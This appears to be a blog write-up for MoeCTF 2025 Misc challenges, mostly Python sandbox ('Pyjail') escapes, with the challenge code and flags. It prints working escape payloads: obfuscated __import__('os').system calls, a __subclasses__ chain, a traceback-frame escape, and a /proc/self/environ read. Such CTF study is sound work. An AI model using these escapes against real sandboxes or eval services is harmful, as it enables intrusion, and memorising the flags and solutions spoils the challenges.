<pre class="language-none"><code class="language-none">moectf&#123;Y0u_4re_a_2048_m4st3r!!!!r0erowhu&#125;</code></pre>
<h2 id="pyjail-0">Pyjail 0</h2>
<blockquote>
<p>A simple reader <del>(所以严格来说这题不算 Pyjail)</del></p>
<p>关于验证码，示例：Please enter the reverse of ‘GZUUAOIS’ to continue:
SIOAUUZG</p>
<p>至于 flag 的位置？你可以参考 Web 第十二章（</p>
</blockquote>
<p><code>Pyjail</code>沙箱逃逸笔记：https://xz.aliyun.com/news/12093</p>
<p>想起了那个把我恶心坏的<code>web</code>第十二章了，在虚拟环境里。</p>
<p>文件路径：<code>/proc/self/environ</code>。</p>
<p>接下来我都在<code>windows</code>上用<code>netcat</code>连接，格式为<code>netcat localhost &lt;port&gt;</code>。</p>
<p>此题输入反转字符串和文件地址即得到：</p>
<pre class="language-none"><code class="language-none">moectf&#123;07a71386-d189-c798-f194-04229b0b07e7&#125;</code></pre>
<h2 id="pyjail-1">Pyjail 1</h2>
<blockquote>
<p>flag 位置在 /tmp 下</p>
</blockquote>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">chall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    user_input <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Give me your code: "</span><span class="token punctuation">)</span>

    <span class="token comment"># 过滤关键字</span>
    forbidden_keywords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'file'</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> keyword <span class="token keyword">in</span> forbidden_keywords<span class="token punctuation">:</span>
        <span class="token keyword">if</span> keyword <span class="token keyword">in</span> user_input<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Forbidden keyword detected: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>keyword<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>
    
    result <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>user_input<span class="token punctuation">)</span></code></pre>
<p>我们可以用<strong>字节数组或字符编码</strong>来构造字符串，避免直接写<code>import</code>，想要执行如下代码我们可以改写：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'__import__'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cat /tmp/flag.txt'</span><span class="token punctuation">)</span>

<span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cat /tmp/flag.txt'</span><span class="token punctuation">)</span></code></pre>
<pre class="language-none"><code class="language-none">moectf&#123;77553abb-2b7a-2c71-1870-4c41d9778a64&#125;</code></pre>
<h2 id="pyjail-2">Pyjail 2</h2>
<blockquote>
<p>flag 位置在 /tmp 下</p>
</blockquote>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">chall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    user_input <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Give me your code: "</span><span class="token punctuation">)</span>

    <span class="token comment"># 过滤关键字</span>
    forbidden_keywords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'file'</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> keyword <span class="token keyword">in</span> forbidden_keywords<span class="token punctuation">:</span>
        <span class="token keyword">if</span> keyword <span class="token keyword">in</span> user_input<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Forbidden keyword detected: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>keyword<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>
    
    <span class="token comment"># 过滤特殊字符</span>
    forbidden_chars <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'['</span><span class="token punctuation">,</span> <span class="token string">']'</span><span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> char <span class="token keyword">in</span> forbidden_chars<span class="token punctuation">:</span>
        <span class="token keyword">if</span> char <span class="token keyword">in</span> user_input<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Forbidden character detected: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>char<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>

    result <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>user_input<span class="token punctuation">)</span></code></pre>
<p><strong>1. 使用<code>chr()</code>编码绕过字符过滤</strong></p>
<p>所有被禁止的字符（如<code>_</code>）和关键字都用<code>chr(ASCII码)</code>表示。</p>
<p><strong>2. 使用<code>getattr()</code>进行属性访问</strong></p>
<p>由于<code>.</code>被禁止，使用<code>getattr(object, attribute)</code>来访问属性。</p>
<p><strong>3.
使用<code>globals()</code>和<code>__getitem__()</code>访问字典</strong></p>
<p>由于<code>[]</code>被禁止，使用：<code>dict[key]</code> →
<code>dict.__getitem__(key)</code> →
<code>getattr(dict, '__getitem__')(key)</code>。</p>
<pre class="language-none"><code class="language-none">__import__(&#39;os&#39;).system(&#39;cat &#x2F;tmp&#x2F;flag.txt&#39;)

getattr(
    getattr(
        getattr(
            getattr(
                globals(),
                &#39;__getitem__&#39;
            )(&#39;__builtins__&#39;),
            &#39;__dict__&#39;,
            getattr(
                globals(),
                &#39;__getitem__&#39;
            )(&#39;__builtins__&#39;)
        ),
        &#39;__getitem__&#39;
    )(&#39;__import__&#39;)(&#39;os&#39;),
    &#39;system&#39;
)(&#39;cat &#x2F;tmp&#x2F;flag.txt&#39;)

getattr(getattr(getattr(getattr(globals(), chr(95)+chr(95)+chr(103)+chr(101)+chr(116)+chr(105)+chr(116)+chr(101)+chr(109)+chr(95)+chr(95))(chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)), chr(95)+chr(95)+chr(100)+chr(105)+chr(99)+chr(116)+chr(95)+chr(95), getattr(globals(), chr(95)+chr(95)+chr(103)+chr(101)+chr(116)+chr(105)+chr(116)+chr(101)+chr(109)+chr(95)+chr(95))(chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95))), chr(95)+chr(95)+chr(103)+chr(101)+chr(116)+chr(105)+chr(116)+chr(101)+chr(109)+chr(95)+chr(95))(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95))(chr(111)+chr(115)), chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109))(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(116)+chr(109)+chr(112)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116))</code></pre>
<pre class="language-none"><code class="language-none">moectf&#123;59042fef-1e84-9185-fcbc-50168d5e02ba&#125;</code></pre>
<h2 id="pyjail-3">Pyjail 3</h2>
<blockquote>
<p>flag 位置在 /tmp 下</p>
</blockquote>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">chall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    user_input <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Give me your code: "</span><span class="token punctuation">)</span>
        
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        result <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>user_input<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token comment"># Hint: When __builtins__ is None, you need to be more creative...</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Code executed successfully!"</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> result <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Return value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Execution error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">type</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>__name__<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre>
<p>即使 <code>__builtins__</code>
被禁用，仍然可以通过<strong>对象继承链</strong>或<strong>现有类的属性</strong>来重新获取内置函数。例如：</p>
<ul>
<li>通过元类（如 <code>().__class__.__mro__</code>）找到基类（如
<code>object</code>）。</li>
<li>遍历子类（如 <code>__subclasses__()</code>）来寻找可用的类（如
<code>os._wrap_close</code>、<code>ModuleSpec</code> 等）。</li>
<li>通过这些类的 <code>__init__.__globals__</code> 或
<code>__builtins__</code> 属性重新获取内置函数。</li>
</ul>
<pre class="language-none"><code class="language-none">([c for c in ().__class__.__mro__[-1].__subclasses__() if c.__name__&#x3D;&#x3D;&#39;ModuleSpec&#39;][0].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;tmp&#x2F;flag.txt&#39;).read())</code></pre>
<pre class="language-none"><code class="language-none">moectf&#123;6486e9b8-47b8-0b5e-dead-8e554dd2a1b6&#125;</code></pre>
<h2 id="pyjail4">Pyjail4</h2>
<blockquote>
<p>flag 位置在 /tmp 下</p>
</blockquote>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> ast
<span class="token keyword">import</span> base64

<span class="token comment"># 自定义 AST 节点访问器来限制可用的语法结构</span>
<span class="token keyword">class</span> <span class="token class-name">RestrictedNodeVisitor</span><span class="token punctuation">(</span>ast<span class="token punctuation">.</span>NodeVisitor<span class="token punctuation">)</span><span class="token punctuation">:</span>
    forbidden_attrs <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"__class__"</span><span class="token punctuation">,</span> <span class="token string">"__dict__"</span><span class="token punctuation">,</span> <span class="token string">"__bases__"</span><span class="token punctuation">,</span> <span class="token string">"__mro__"</span><span class="token punctuation">,</span> <span class="token string">"__subclasses__"</span><span class="token punctuation">,</span>
        <span class="token string">"__globals__"</span><span class="token punctuation">,</span> <span class="token string">"__code__"</span><span class="token punctuation">,</span> <span class="token string">"__closure__"</span><span class="token punctuation">,</span> <span class="token string">"__func__"</span><span class="token punctuation">,</span> <span class="token string">"__self__"</span><span class="token punctuation">,</span>
        <span class="token string">"__module__"</span><span class="token punctuation">,</span> <span class="token string">"__import__"</span><span class="token punctuation">,</span> <span class="token string">"__builtins__"</span><span class="token punctuation">,</span> <span class="token string">"__base__"</span><span class="token punctuation">,</span> <span class="token string">"__init__"</span><span class="token punctuation">,</span> <span class="token string">"__getattribute__"</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">def</span> <span class="token function">visit_Attribute</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># 禁止危险属性访问</span>
        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>attr<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token keyword">and</span> node<span class="token punctuation">.</span>attr <span class="token keyword">in</span> self<span class="token punctuation">.</span>forbidden_attrs<span class="token punctuation">:</span>
            <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Access to attribute '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>node<span class="token punctuation">.</span>attr<span class="token punctuation">&#125;</span></span><span class="token string">' is forbidden!"</span></span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>generic_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">chall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    user_input <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Give me your code after base64 encoding it: "</span><span class="token punctuation">)</span>
    code <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>user_input<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> <span class="token keyword">not</span> user_input<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Empty input!"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token comment"># 使用 AST 解析和验证代码</span>
        tree <span class="token operator">=</span> ast<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>code<span class="token punctuation">)</span>
        visitor <span class="token operator">=</span> RestrictedNodeVisitor<span class="token punctuation">(</span><span class="token punctuation">)</span>
        visitor<span class="token punctuation">.</span>visit<span class="token punctuation">(</span>tree<span class="token punctuation">)</span>
        
        <span class="token comment"># 创建受限的执行环境</span>
        safe_builtins <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"print"</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">,</span>
            <span class="token string">"filter"</span><span class="token punctuation">:</span> <span class="token builtin">filter</span><span class="token punctuation">,</span>
            <span class="token string">"list"</span><span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">,</span>
            <span class="token string">"len"</span><span class="token punctuation">:</span> <span class="token builtin">len</span><span class="token punctuation">,</span>
            <span class="token string">"Exception"</span><span class="token punctuation">:</span> Exception
        <span class="token punctuation">&#125;</span>

        safe_globals <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> safe_builtins<span class="token punctuation">&#125;</span>
        
        <span class="token comment"># 执行用户代码</span>
        <span class="token keyword">exec</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> safe_globals<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Code executed successfully!"</span><span class="token punctuation">)</span>
            
    <span class="token keyword">except</span> SyntaxError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Syntax Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> RuntimeError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Runtime Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Execution Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">type</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>__name__<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre>
<p><strong>在Python中，栈帧（Stack
Frame）是解释器用于管理函数调用的一种内部数据结构。每当一个函数被调用时，Python就会创建一个栈帧对象，其中包含了该函数执行所需的“上下文”，例如局部变量、传入的参数以及当前指令的位置（返回地址）。</strong></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
code <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
try:
    raise Exception()
except Exception as e:
    frame = e.__traceback__.tb_frame.f_back
    builtins = frame.f_globals['__builtins__']
    print(builtins.open('/tmp/flag.txt').read())
"""</span>

encoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>code<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>encoded<span class="token punctuation">)</span>

dHJ5OgogICAgcmFpc2UgRXhjZXB0aW9uKCkKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgZnJhbWUgPSBlLl9fdHJhY2ViYWNrX18udGJfZnJhbWUuZl9iYWNrCiAgICBidWlsdGlucyA9IGZyYW1lLmZfZ2xvYmFsc1snX19idWlsdGluc19fJ10KICAgIHByaW50KGJ1aWx0aW5zLm9wZW4oJy90bXAvZmxhZy50eHQnKS5yZWFkKCkp</code></pre>
<pre class="language-none"><code class="language-none">moectf&#123;8e6909e8-7b9b-1c08-3131-46859e6830d9&#125;</code></pre>
<h2 id="moectf指导版">MoeCTF指导版</h2>
<blockquote>
<p>最近锤子太多了，都忙不过来了！！为了帮助大家更好地可以完成题目，fifker找到了一个好帮手…它可能有点…（？</p>
<p>耄耋：拿到flag的方法都告诉你了，你二朵隆吗？？（哈</p>
<p>（这只是一个游戏，没有任何web知识点考察，也不需要任何web手段，千万不要使用，否则会影响游戏体验）</p>
<p>（游戏加载需要一定时间）</p>
</blockquote>
<p>查看源代码有助于做题。</p>
<p><strong>第一关</strong>：精准投喂<code>25</code>个小鱼干，不然会触发<code>114514</code></p>
<p><strong>第二关</strong>：找信息即可<code>241410173</code>和<code>241410156</code></p>
<p><strong>第三关</strong>：文字游戏，密码分别是<code>password</code>
和<code>incorrect!</code></p>
<p><strong>第四关</strong>：复制发现隐藏的密钥<code>xbhiuebkjvs</code></p>
<p><strong>第五关</strong>：翻转后点击<code>flag</code>按钮凸了</p>
<pre class="language-none"><code class="language-none">moectf&#123;11738832-155d-3f7a-cc6b-95da7459659d&#125;</code></pre>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Sa1ntCHEN</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://saintcen.github.io/2025/10/13/MoeCTF2025_Misc_wp/">https://saintcen.github.io/2025/10/13/MoeCTF2025_Misc_wp/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">Sa1ntCHEN</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/CTF/">
                                    <span class="chip bg-color">CTF</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2025/10/17/%E4%BD%A0%E7%BC%BA%E5%A4%B1%E7%9A%84%E9%82%A3%E9%97%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%BE/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="你缺失的那门计算机课">
                        
                        <span class="card-title">你缺失的那门计算机课</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2025-10-17
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E6%95%99%E7%A8%8B/" class="post-category">
                                    教程
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CS%E5%9F%BA%E7%A1%80/">
                        <span class="chip bg-color">CS基础</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2025/10/13/MoeCTF2025_Web_wp/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="MoeCTF2025_Web_wp">
                        
                        <span class="card-title">MoeCTF2025_Web_wp</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2025-10-13
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E7%AC%94%E8%AE%B0/" class="post-category">
                                    笔记
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF/">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- 是否加载使用自带的 prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>


<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>




    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>


<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script>
    MathJax.Hub.Config({
        tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
    });
</script>



    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
